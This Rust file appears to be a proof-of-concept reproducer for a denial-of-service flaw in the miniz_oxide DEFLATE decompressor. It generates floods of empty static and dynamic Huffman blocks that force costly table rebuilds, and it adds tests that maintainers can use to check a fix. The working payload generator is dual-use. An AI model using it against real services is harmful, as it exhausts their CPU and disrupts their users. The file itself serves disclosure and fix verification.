//! Reproducer for Frommi/miniz_oxide#198 — the `init_tree()`-per-block DoS,
//! covering BOTH block variants so a fix can be checked dynamically, not just by
//! reading the diff.
//!
//! Every DEFLATE block header forces a full Huffman-table rebuild (`init_tree`:
//! an unconditional 1024-entry `look_up.fill` + 576-entry `tree.fill`, plus
//! per-symbol placement), regardless of how much the block outputs. A block can
//! legally output 0 bytes, so a chain of minimal degenerate blocks forces
//! arbitrary rebuild work while the `_with_limit` output cap never engages.
//!
//! - `BTYPE=1` (static/fixed Huffman): ~1.25 bytes/block. Precomputing the fixed
//!   table (zlib's `inffixed.h` approach) removes this variant.
//! - `BTYPE=2` (dynamic Huffman): ~11.5 bytes/block. The table is defined in the
//!   stream and is rebuilt per block no matter what, so precomputing the fixed
//!   table does NOT remove this variant — only bounding per-block work does.
//!
//! Run modes:
//!   cargo run --release          -> prints the both-variants timing table
//!   cargo test  --release        -> correctness gate (both variants decode to
//!                                   an empty Vec) + an opt-in timing regression
//!                                   test (`cargo test --release -- --ignored`)
//!
//! Depends only on published `miniz_oxide` (see Cargo.toml). To check a fix,
//! point that dependency at the fix branch and re-run.

/// LSB-first bit writer (DEFLATE data-element bit order).
struct BitWriter {
    bytes: Vec<u8>,
    cur: u8,
    nbits: u8,
}
impl BitWriter {
    fn new() -> Self {
        BitWriter { bytes: Vec::new(), cur: 0, nbits: 0 }
    }
    /// Low `n` bits of `val`, LSB first (fixed-width fields + extra bits).
    fn put_bits(&mut self, val: u32, n: u8) {
        for i in 0..n {
            let b = ((val >> i) & 1) as u8;
            self.cur |= b << self.nbits;
            self.nbits += 1;
            if self.nbits == 8 {
                self.bytes.push(self.cur);
                self.cur = 0;
                self.nbits = 0;
            }
        }
    }
    /// Canonical Huffman code, emitted MSB-first (RFC 1951 §3.1.1) into the
    /// LSB-first stream, i.e. bit-reversed over its length.
    fn put_huff(&mut self, code: u32, len: u8) {
        let mut rev = 0u32;
        for i in 0..len {
            rev |= ((code >> i) & 1) << (len - 1 - i);
        }
        self.put_bits(rev, len);
    }
    fn finish(mut self) -> Vec<u8> {
        if self.nbits > 0 {
            self.bytes.push(self.cur);
        }
        self.bytes
    }
}

/// N back-to-back minimal `BTYPE=1` (static/fixed Huffman) blocks, each 0 output.
/// Header 3 bits + 7-bit fixed EOB code (symbol 256 = `0000000`) = 10 bits.
pub fn build_static_chain(n: usize) -> Vec<u8> {
    let mut w = BitWriter::new();
    for i in 0..n {
        w.put_bits((i == n - 1) as u32, 1); // BFINAL
        w.put_bits(0b01, 2); // BTYPE = 1 (static)
        w.put_huff(0b0000000, 7); // fixed EOB (symbol 256)
    }
    w.finish()
}

/// One minimal `BTYPE=2` (dynamic Huffman) block, 0 output.
///
/// Code-length ("hufflen") code: sym 18 -> len 1 (code 0), sym 0 -> len 2
/// (0b10), sym 1 -> len 2 (0b11); Kraft = 1/2+1/4+1/4 = 1 (complete, required).
/// Litlen alphabet: 257 declared, only symbol 256 (EOB) has length 1 -> a legal
/// incomplete table (max_code_len == 1). Dist alphabet: 1 declared, length 0.
fn put_dynamic_empty_block(w: &mut BitWriter, is_last: bool) {
    w.put_bits(is_last as u32, 1); // BFINAL
    w.put_bits(0b10, 2); // BTYPE = 2 (dynamic)
    w.put_bits(0, 5); // HLIT  = 0 -> 257 litlen codes
    w.put_bits(0, 5); // HDIST = 0 -> 1 dist code
    w.put_bits(14, 4); // HCLEN = 14 -> 18 code-length codes declared

    // 18 code-length code lengths (3 bits each) in permuted order
    // [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1]; set 18->1, 0->2, 1->2.
    for &l in &[0u8, 0, 1, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2] {
        w.put_bits(l as u32, 3);
    }

    // Canonical hufflen codes.
    let huff = |sym: u8| -> (u32, u8) {
        match sym {
            18 => (0b0, 1),
            0 => (0b10, 2),
            1 => (0b11, 2),
            _ => unreachable!(),
        }
    };

    // Encode the 258 code lengths (257 litlen + 1 dist):
    //   0..=255 : length 0  (256 zeros: sym18 runs of 138 + 118)
    //   256     : length 1  (sym1)  -- the EOB code
    //   dist 0  : length 0  (sym0)
    let (c18, l18) = huff(18);
    w.put_huff(c18, l18);
    w.put_bits(138 - 11, 7);
    w.put_huff(c18, l18);
    w.put_bits(118 - 11, 7);
    let (c1, l1) = huff(1);
    w.put_huff(c1, l1);
    let (c0, l0) = huff(0);
    w.put_huff(c0, l0);

    // Data: just EOB (symbol 256, its 1-bit code is 0).
    w.put_huff(0b0, 1);
}

/// N back-to-back minimal `BTYPE=2` (dynamic Huffman) blocks, each 0 output.
pub fn build_dynamic_chain(n: usize) -> Vec<u8> {
    let mut w = BitWriter::new();
    for i in 0..n {
        put_dynamic_empty_block(&mut w, i == n - 1);
    }
    w.finish()
}

fn decompress(payload: &[u8]) -> Result<Vec<u8>, miniz_oxide::inflate::DecompressError> {
    miniz_oxide::inflate::decompress_to_vec_with_limit(payload, 1 << 30)
}

fn main() {
    // Correctness gate: a single block of each kind must decode to empty. If the
    // bit-packing were wrong the crate would error here instead of measuring a
    // bogus payload.
    assert_eq!(decompress(&build_static_chain(1)).unwrap().len(), 0);
    assert_eq!(decompress(&build_dynamic_chain(1)).unwrap().len(), 0);
    println!("sanity: one static block and one dynamic block each decode to 0 bytes\n");

    let ns = [1_000usize, 10_000, 100_000, 1_000_000];
    for (label, build) in [
        ("STATIC  (BTYPE=1)", build_static_chain as fn(usize) -> Vec<u8>),
        ("DYNAMIC (BTYPE=2)", build_dynamic_chain as fn(usize) -> Vec<u8>),
    ] {
        println!("=== {label} block flood ===");
        println!("{:>10} | {:>13} | {:>7} | {:>10} | {:>12}", "N_blocks", "payload_B", "out_len", "elapsed", "bytes/block");
        for &n in &ns {
            let payload = build(n);
            let t = std::time::Instant::now();
            let out = decompress(&payload).unwrap();
            let el = t.elapsed();
            println!(
                "{:>10} | {:>13} | {:>7} | {:>10.3?} | {:>12.2}",
                n, payload.len(), out.len(), el, payload.len() as f64 / n as f64
            );
        }
        println!();
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{Duration, Instant};

    // Non-flaky, fix-agnostic: both degenerate floods must still decode to an
    // empty Vec (a fix must not break correctness). Passes on current code and
    // must keep passing on any fix that returns Ok for these inputs. (A budget-
    // style fix that instead returns Err on a huge flood is also fine — adjust
    // the expected result to match whichever direction the fix takes.)
    #[test]
    fn both_variants_decode_empty() {
        for n in [1usize, 2, 10, 1000] {
            assert_eq!(decompress(&build_static_chain(n)).unwrap(), Vec::<u8>::new(),
                "static chain of {n} blocks should decode to empty");
            assert_eq!(decompress(&build_dynamic_chain(n)).unwrap(), Vec::<u8>::new(),
                "dynamic chain of {n} blocks should decode to empty");
        }
    }

    // Opt-in timing regression (run with `--release -- --ignored`). This is the
    // "verify dynamically" check: it is DESIGNED TO FAIL on unmodified code and
    // pass once the per-block rebuild work is bounded, so the maintainer can run
    // it on current `main` (watch it fail), apply a fix, and run it again.
    //
    // On this machine unmodified 0.9.1 takes ~2.0-2.3 s for a 1e6-block flood of
    // either kind; the 500 ms ceiling is ~4x below that and far above any real
    // fix (all candidate fixes bring a degenerate flood to tens of ms or error
    // out early). `#[ignore]`d because wall-clock assertions are machine-
    // dependent and don't belong in normal CI.
    //
    // Which variants pass depends on the fix, and that difference is the point:
    //   - precompute the fixed table (zlib inffixed.h style): STATIC passes,
    //     DYNAMIC still fails — demonstrates that fix alone is incomplete.
    //   - make init_tree's fill proportional to used entries: BOTH pass.
    //   - opt-in rebuild budget (the linked PR): this test uses the *default*
    //     `_with_limit` API, whose budget stays unbounded, so it will still fail;
    //     verify that fix instead via the new `_with_limits` API with a small
    //     budget (expect a fast Err), not through this test.
    #[test]
    #[ignore = "timing-dependent; designed to fail until fixed. run with --release -- --ignored"]
    fn degenerate_flood_is_bounded() {
        const CEILING: Duration = Duration::from_millis(500);
        for (label, payload) in [
            ("static", build_static_chain(1_000_000)),
            ("dynamic", build_dynamic_chain(1_000_000)),
        ] {
            let t = Instant::now();
            let out = decompress(&payload).unwrap();
            let el = t.elapsed();
            assert_eq!(out.len(), 0);
            assert!(el < CEILING,
                "{label} 1M-block flood took {el:?} (> {CEILING:?}) — per-block \
                 rebuild work is not bounded (issue #198). payload={} bytes",
                payload.len());
        }
    }
}
